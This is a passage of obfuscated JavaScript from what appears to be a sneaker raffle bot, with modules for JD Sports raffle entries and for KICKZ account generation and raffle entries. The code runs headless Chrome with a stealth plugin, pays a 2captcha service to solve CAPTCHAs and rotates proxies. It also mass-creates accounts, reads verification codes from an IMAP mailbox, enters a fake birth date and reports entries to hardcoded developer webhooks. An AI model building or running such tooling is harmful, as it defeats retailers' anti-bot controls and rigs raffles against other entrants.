                            _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x54d9fc['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x54d9fc['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x4f6cb7, _0x54d9fc['succesPUBMSG']);
                        } catch (_0x3f93a9) {
                            console['log'](_0x467028['yellow'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0xf53d11 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3f93a9));
                        }
                        console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0xd36ac7['name'] + ']\x20Task\x20' + (_0xf53d11 + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x20dbe5 != 0x0 || _0x521e15 != 0x0 && !_0x4ceeda) && (_0x3980ff['push'](_0x3f142f), _0x3e92a1['writeFileSync']('forms/templates.json', JSON['stringify'](_0x3980ff, null, 0x2), 'utf-8'));
                    } catch (_0x225134) {
                        console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0xd36ac7['name'] + ']\x20Task\x20' + (_0xf53d11 + 0x1) + '\x20:\x20' + _0x225134)), _0x5647b6 = '' + _0x225134;
                        var _0x461e7f = await _0x18ad5f(_0x17b51c[_0xf53d11], _0xd36ac7, 'dev', !![], _0x5647b6);
                        let _0x3acd92 = {};
                        _0x3acd92['errorDEV'] = { 'embeds': [_0x461e7f] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x3acd92['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x3acd92['errorDEV']), _0x283225 = 'yes';
                    } finally {
                        _0x56ea2b && _0x56ea2b['close']();
                        if (_0x283225 == 'yes' && _0x475eb3 != 0x5) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0xd36ac7['name'] + ']\x20Task\x20' + (_0xf53d11 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x475eb3 + 0x1) + '\x20/\x205)')), _0xf53d11--, _0x475eb3++;
                            continue;
                        }
                        if (_0x283225 == 'yes' && _0x475eb3 == 0x5) {
                            _0x475eb3 = 0x0, _0x283225 = 'no';
                            continue;
                        }
                        _0x53444d('Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x22fa28, _0x5857f3, _0x4c0bd9) {
                var _0x2e8786 = ![], _0x5c287d = ![];
                if (_0x24de00['captchaKey'] == '' || _0x24de00['captchaKey'] == undefined)
                    return console['log'](_0x467028['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x24de00['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x46c550 = 0x0; _0x46c550 < _0x5857f3['length']; _0x46c550++) {
                    if (_0x555a94 != 'yes')
                        var _0x555a94 = '', _0xc6fab5 = 0x0;
                    var _0x186256, _0x7e14aa = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x5857f3[_0x46c550]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x5857f3[_0x46c550]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x4a1218
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x24de00['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5e0c2d
                            }
                        ]
                    }];
                    const _0x82185c = { 'embeds': _0x7e14aa };
                    _0x1bf238(_0x22fa28['name'] + '\x20Task\x20' + (_0x46c550 + 0x1) + '\x20/\x20' + _0x5857f3['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                    try {
                        await _0x4626f3(_0x5857f3, _0x46c550);
                    } catch {
                        _0x555a94 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x904092 = await _0x18ad5f(_0x5857f3[_0x46c550], _0x22fa28, 'dev', ![]), _0x163371 = await _0x18ad5f(_0x5857f3[_0x46c550], _0x22fa28, 'pub', ![]);
                    const _0x5b2fbc = {
                        'succesDEVMSG': { 'embeds': [_0x904092] },
                        'succesPUBMSG': { 'embeds': [_0x163371] }
                    };
                    if (_0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '')
                        try {
                            await _0x2dfd24(_0x24de00['webhook'], _0x5b2fbc['succesDEVMSG']);
                        } catch {
                        }
                    await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x5b2fbc['succesDEVMSG']), await _0x254c61(0xc8);
                    try {
                        await _0x2dfd24(_0x4f6cb7, _0x5b2fbc['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x5857f3[_0x46c550]['Email'] == '' || _0x5857f3[_0x46c550]['Url'] == '' || _0x5857f3[_0x46c550]['FirstName'] == '' || _0x5857f3[_0x46c550]['LastName'] == '') {
                        console['log'](_0x36583e() + '\x20[' + _0x4f8d63[taskModule]['name'] + ']\x20Task\x20' + (_0x46c550 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x24de00['useRandomProxy'] = ![])
                        var _0x48e3fd = _0x4c0bd9[_0x46c550]['split'](':');
                    else
                        var _0x2cafd6 = Math['round'](Math['random']() * (_0x4c0bd9['length'] - 0x1)), _0x48e3fd = _0x4c0bd9[_0x2cafd6]['split'](':');
                    var _0x34255d;
                    try {
                        _0x34255d = await _0x48f2a7['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x48e3fd[0x0] + ':' + _0x48e3fd[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x34255d = await _0x48f2a7['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x48e3fd[0x0] + ':' + _0x48e3fd[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x291414 = await _0x34255d['newPage']();
                        await _0x291414['authenticate']({
                            'username': '' + _0x48e3fd[0x2],
                            'password': '' + _0x48e3fd[0x3]
                        }), console['log'](_0x36583e() + '\x20[' + _0x22fa28['name'] + ']\x20Task\x20' + (_0x46c550 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x291414['setRequestInterception'](!![]), _0x291414['on']('request', _0x5a0b0c => {
                            _0x5a0b0c['resourceType']() === 'image' || _0x5a0b0c['resourceType']() === 'font' || _0x5a0b0c['resourceType']() === 'media' ? _0x5a0b0c['abort']() : _0x5a0b0c['continue']();
                        });
                        try {
                            await _0x291414['goto']('' + _0x5857f3[_0x46c550]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x291414['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x36583e() + '\x20[' + _0x22fa28['name'] + ']\x20Task\x20' + (_0x46c550 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x291414['type']('#comp_firstname', '' + _0x5857f3[_0x46c550]['FirstName']), await _0x291414['waitForSelector']('#comp_lastname'), await _0x291414['type']('#comp_lastname', '' + _0x5857f3[_0x46c550]['LastName']), await _0x291414['waitForSelector']('#comp_email'), await _0x291414['type']('#comp_email', '' + _0x5857f3[_0x46c550]['Email']), await _0x291414['waitForSelector']('#comp_paypalemail'), await _0x291414['type']('#comp_paypalemail', '' + _0x5857f3[_0x46c550]['Email']), await _0x291414['waitForSelector']('#comp_mobile_end'), await _0x291414['type']('#comp_mobile_end', '' + _0x5857f3[_0x46c550]['Phone']), await _0x291414['waitForSelector']('#comp_dob'), await _0x291414['type']('#comp_dob', '08/09/1992'), console['log'](_0x36583e() + '\x20[' + _0x22fa28['name'] + ']\x20Task\x20' + (_0x46c550 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x5857f3[_0x46c550]['Size'] == 'RANDOM') {
                            const _0x393800 = await _0x291414['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x5cb764 => {
                                return _0x5cb764['map'](_0x3988ed => _0x3988ed['value']);
                            });
                            var _0x497673 = Math['round'](Math['random']() * (_0x393800['length'] - 0x2));
                            await _0x291414['select']('#shoesize', _0x393800[_0x497673 + 0x1]), await _0x254c61(0x3e8);
                        } else {
                            const _0x3364b9 = await _0x291414['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4bddf1 => {
                                return _0x4bddf1['map'](_0x234c3d => _0x234c3d['innerText']);
                            }), _0x1cc41b = await _0x291414['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2cd3d7 => {
                                return _0x2cd3d7['map'](_0x29385d => _0x29385d['value']);
                            });
                            var _0x4b0fd6 = _0x5857f3[_0x46c550]['Size'];
                            for (var _0x18ae14 = 0x1; _0x18ae14 < _0x1cc41b['length']; _0x18ae14++) {
                                var _0x5dfa5a = _0x3364b9[_0x18ae14]['split']('\x20')[0x0];
                                if (_0x5dfa5a == _0x4b0fd6) {
                                    await _0x291414['select']('#shoesize', _0x1cc41b[_0x18ae14]);
                                    break;
                                } else {
                                    if (_0x18ae14 + 0x1 == _0x1cc41b['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x291414['waitForSelector']('#comp_address1'), await _0x291414['type']('#comp_address1', _0x5857f3[_0x46c550]['Address1'] + '\x20' + _0x5857f3[_0x46c550]['HouseNumber']), await _0x291414['waitForSelector']('#comp_address2'), await _0x291414['type']('#comp_address2', '' + _0x5857f3[_0x46c550]['Address2']), await _0x291414['waitForSelector']('#comp_address2'), await _0x291414['type']('#comp_address3', '' + _0x5857f3[_0x46c550]['City']), await _0x291414['waitForSelector']('#comp_postcode'), await _0x291414['type']('#comp_postcode', '' + _0x5857f3[_0x46c550]['Zip']), console['log'](_0x36583e() + '\x20[' + _0x22fa28['name'] + ']\x20Task\x20' + (_0x46c550 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x254c61(0x4b0), await _0x291414['click']('label#emailhold'), await _0x254c61(0x5dc), await _0x291414['click']('#preauth_tandc_email\x20>\x20label'), await _0x254c61(0x5dc), await _0x291414['click']('#submit');
                        try {
                            await _0x291414['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x36583e() + '\x20[' + _0x22fa28['name'] + ']\x20Task\x20' + (_0x46c550 + 0x1) + '\x20:\x20' + _0x467028['blue']('Awaiting\x20Paypal\x20Payment')), _0x34255d['on']('targetcreated', async _0xb78761 => {
                            if (_0xb78761['type']() === 'page') {
                                const _0x8ec129 = await _0xb78761['page']();
                                async function _0x43ba7e() {
                                    try {
                                        await _0x291414['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x5c287d = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x506aea() {
                                    try {
                                        await _0x291414['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x2e8786 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x506aea(), _0x43ba7e(), await _0x254c61(0x493e0);
                            }
                        });
                        async function _0x546ba8() {
                            for (let _0x4554df = 0x0; _0x4554df < 0x12c; _0x4554df++) {
                                if (_0x2e8786 == !![]) {
                                    _0x555a94 = 'no', _0x547244(_0x5857f3[_0x46c550], _0x22fa28), console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x22fa28['name'] + ']\x20Task\x20' + (_0x46c550 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '')
                                        try {
                                            await _0x2dfd24(_0x24de00['webhook'], _0x5b2fbc['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x5b2fbc['succesDEVMSG']), await _0x254c61(0xc8);
                                    try {
                                        await _0x2dfd24(_0x4f6cb7, _0x5b2fbc['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x5c287d)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x254c61(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x254c61(0xbb8), await _0x291414['click']('.zoid-outlet'), await _0x254c61(0x7d0), await _0x546ba8();
                    } catch (_0xd7956d) {
                        console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x22fa28['name'] + ']\x20Task\x20' + (_0x46c550 + 0x1) + '\x20:\x20' + _0xd7956d)), _0x186256 = '' + _0xd7956d;
                        var _0x348f51 = await _0x18ad5f(_0x5857f3[_0x46c550], _0x22fa28, 'dev', !![], _0x186256);
                        _0x5b2fbc['errorDEV'] = { 'embeds': [_0x348f51] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x5b2fbc['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x5b2fbc['errorDEV']);
                    } finally {
                        _0x34255d && _0x34255d['close']();
                        if (_0x555a94 == 'yes' && _0xc6fab5 != 0x5 && _0x186256 != 'Size\x20Not\x20Found') {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x22fa28['name'] + ']\x20Task\x20' + (_0x46c550 + 0x1) + '\x20:\x20Retrying\x20(' + _0xc6fab5 + '\x20/\x205)')), _0x46c550 = _0x46c550 - 0x1, _0xc6fab5 = _0xc6fab5 + 0x1;
                            continue;
                        }
                        _0x555a94 == 'yes' && _0xc6fab5 >= 0x5 && (_0x9088f0(afew[_0x46c550], _0x22fa28), _0x555a94 = 'no', _0xc6fab5 = 0x0), console['log']('Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x147e23, _0x2af910, _0x315f23) {
                    _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x24de00['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x24486e = 0x0; _0x24486e < _0x2af910['length']; _0x24486e++) {
                        const _0x85b3a9 = 'https://www.kickz.com/login';
                        if (_0x15444e != 'yes')
                            var _0x15444e = '', _0x454aac = 0x0;
                        _0x1bf238(_0x147e23['name'] + '\x20Task\x20' + (_0x24486e + 0x1) + '\x20/\x20' + _0x2af910['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                        try {
                            await _0x4626f3(_0x2af910, _0x24486e);
                        } catch {
                            _0x15444e = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x16c70d = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4a1218
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x24de00['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5e0c2d
                                }
                            ]
                        }];
                        const _0x3cd40a = { 'embeds': _0x16c70d };
                        var _0x26be05 = await _0x18ad5f(_0x2af910[_0x24486e], _0x147e23, 'acc', ![]);
                        const _0x58952f = { 'succesDEVMSG': { 'embeds': [_0x26be05] } };
                        if (_0x2af910[_0x24486e]['Email'] == '' || _0x2af910[_0x24486e]['FirstName'] == '' || _0x2af910[_0x24486e]['LastName'] == '') {
                            console['log'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x2af910[_0x24486e]['Password'] == '' && (_0x2af910[_0x24486e]['Password'] = 'JRaffles23!');
                        if (_0x24de00['useRandomProxy'] = ![])
                            var _0x467775 = _0x315f23[_0x24486e]['split'](':');
                        else
                            var _0x381a36 = Math['round'](Math['random']() * (_0x315f23['length'] - 0x1)), _0x467775 = _0x315f23[_0x381a36]['split'](':');
                        var _0x591259;
                        try {
                            _0x591259 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x467775[0x0] + ':' + _0x467775[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x591259 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x467775[0x0] + ':' + _0x467775[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4e078f = await _0x591259['newPage']();
                            await _0x4e078f['authenticate']({
                                'username': '' + _0x467775[0x2],
                                'password': '' + _0x467775[0x3]
                            }), console['log'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4e078f['setRequestInterception'](!![]), _0x4e078f['on']('request', _0x26a735 => {
                                _0x26a735['resourceType']() === 'image' || _0x26a735['resourceType']() === 'font' || _0x26a735['resourceType']() === 'media' ? _0x26a735['abort']() : _0x26a735['continue']();
                            }), await _0x4e078f['goto'](_0x85b3a9), await _0x254c61(0xbb8), console['log'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x4e078f['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4e078f['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4e078f['waitForSelector']('#button-register'), await _0x254c61(0x7d0), await _0x4e078f['evaluate'](() => {
                                const _0x279bf8 = document['querySelector']('#button-register');
                                _0x279bf8['click']();
                            }), console['log'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x254c61(0x1388), await _0x4e078f['waitForSelector']('#customer_salutation'), await _0x4e078f['select']('#customer_salutation', 'mr'), await _0x254c61(0x7d0), await _0x4e078f['waitForSelector']('#customer_firstname'), await _0x4e078f['type']('#customer_firstname', '' + _0x2af910[_0x24486e]['FirstName']), await _0x254c61(0x352), await _0x4e078f['waitForSelector']('#customer_lastname'), await _0x4e078f['type']('#customer_lastname', '' + _0x2af910[_0x24486e]['LastName']), await _0x254c61(0x352), await _0x4e078f['type']('#email-input', '' + _0x2af910[_0x24486e]['Email']), await _0x254c61(0x352), await _0x4e078f['type']('#email-confirm-input', '' + _0x2af910[_0x24486e]['Email']), await _0x254c61(0x352), await _0x4e078f['type']('#register-password', '' + _0x2af910[_0x24486e]['Password']), await _0x254c61(0x352), await _0x4e078f['type']('#password-confirm', '' + _0x2af910[_0x24486e]['Password']), await _0x254c61(0x352), console['log'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x4e078f['click']('#consent'), await _0x254c61(0x1f4);
                            const _0x45fbb5 = await _0x4e078f['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x45fbb5) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x4e078f['click']('#buttonRegister');
                            try {
                                await _0x4e078f['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x2af910[_0x24486e]['Email']), await _0x254c61(0x4b0);
                            async function _0x283c0d() {
                                var _0x42ef0c, _0x2349d6 = ![];
                                for (var _0x3744cf = 0x0; _0x3744cf < 0x18; _0x3744cf++) {
                                    async function _0x44173b() {
                                        var _0x3f858d = new _0x2796bc({
                                            'user': _0x24de00['masterMail'],
                                            'password': _0x24de00['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x4d96b0(_0x3fa498) {
                                            _0x3f858d['openBox']('INBOX', ![], _0x3fa498);
                                        }
                                        _0x3f858d['once']('ready', function () {
                                            console['log'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x4d96b0(function (_0x1daaac, _0x5337f5) {
                                                console['log'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x1daaac)
                                                    throw _0x1daaac;
                                                _0x3f858d['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x146b05, _0x7cd61e) {
                                                    if (!_0x7cd61e || !_0x7cd61e['length'])
                                                        console['log'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x3f858d['end']();
                                                    else {
                                                        var _0x51c28f = _0x3f858d['seq']['fetch'](_0x7cd61e, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x51c28f['on']('message', function (_0x1f867c, _0x4886e9) {
                                                            var _0x41255e = '(#' + _0x4886e9 + ')\x20';
                                                            _0x1f867c['on']('body', function (_0x2aa2dc, _0xb17983) {
                                                                _0x1a979e(_0x2aa2dc, (_0x36a4f3, _0xcc5da0) => {
                                                                    if (_0xcc5da0['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x3b3530 = _0xcc5da0['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x337a1e = _0x3b3530[0x1]['split']('<')[0x0];
                                                                        _0x42ef0c = _0x337a1e;
                                                                    }
                                                                });
                                                            }), _0x1f867c['once']('end', function () {
                                                            });
                                                        }), _0x51c28f['once']('error', function (_0x2a6255) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x51c28f['once']('end', function () {
                                                            _0x3f858d['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x3f858d['once']('error', function (_0x507e74) {
                                            console['log'](_0x467028['red'](_0x507e74['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2349d6 = !![];
                                        }), _0x3f858d['once']('end', async function () {
                                        }), _0x3f858d['connect']();
                                    }
                                    _0x44173b(), await _0x254c61(0x1388);
                                    if (_0x42ef0c)
                                        return _0x42ef0c;
                                    if (_0x2349d6)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x3744cf == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x283c0d(), _0x254c61(0x320), console['log'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Verifying..'), await _0x4e078f['type']('#verificationCode', code), await _0x254c61(0x1f4), await _0x4e078f['click']('#buttonVerify'), await _0x254c61(0x190), await _0x4e078f['click']('#buttonVerify'), await _0x254c61(0x3e8);
                            try {
                                await _0x4e078f['waitForSelector']('div.b-user_greeting'), _0x15444e = 'no', console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Account\x20' + _0x2af910[_0x24486e]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x3e92a1['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x2af910[_0x24486e]['Email'] + ',' + _0x2af910[_0x24486e]['Password'] + ','), console['log'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Account\x20' + _0x2af910[_0x24486e]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x58952f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x2dfd24(_0x43241a, _0x58952f['succesDEVMSG']);
                            } catch {
                                _0x15444e = 'no', console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x4f0b53) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20' + _0x4f0b53)), _0x16c70d[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x16c70d[0x0]['description'] = '' + _0x4f0b53, await _0x2dfd24(_0x3fd40a, _0x3cd40a), _0x15444e = 'yes';
                        } finally {
                            _0x591259 && _0x591259['close']();
                            if (_0x15444e == 'yes' && _0x454aac != 0x5) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x147e23['name'] + ']\x20Task\x20' + (_0x24486e + 0x1) + '\x20:\x20Retrying\x20(' + _0x454aac + '\x20/\x205)')), _0x24486e = _0x24486e - 0x1, _0x454aac = _0x454aac + 0x1;
                                continue;
                            }
                            _0x15444e == 'yes' && _0x454aac >= 0x5 && (_0x9088f0(_0x2af910[_0x24486e], _0x147e23), _0x15444e = 'no', _0x454aac = 0x0), console['log']('Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x22c27d, _0x2a5254, _0x450771) {
                    _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x24de00['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1fcfff = 0x0; _0x1fcfff < _0x2a5254['length']; _0x1fcfff++) {
                        var _0x590918;
                        if (_0x6c089f != 'yes')
                            var _0x6c089f = '', _0x1b0691 = 0x0;
                        _0x1bf238(_0x22c27d['name'] + '\x20Task\x20' + (_0x1fcfff + 0x1) + '\x20/\x20' + _0x2a5254['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                        var _0xfe37a8 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4a1218
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x2a5254[_0x1fcfff]['Url']
                                },
                                {
                                    'name': 'Size',
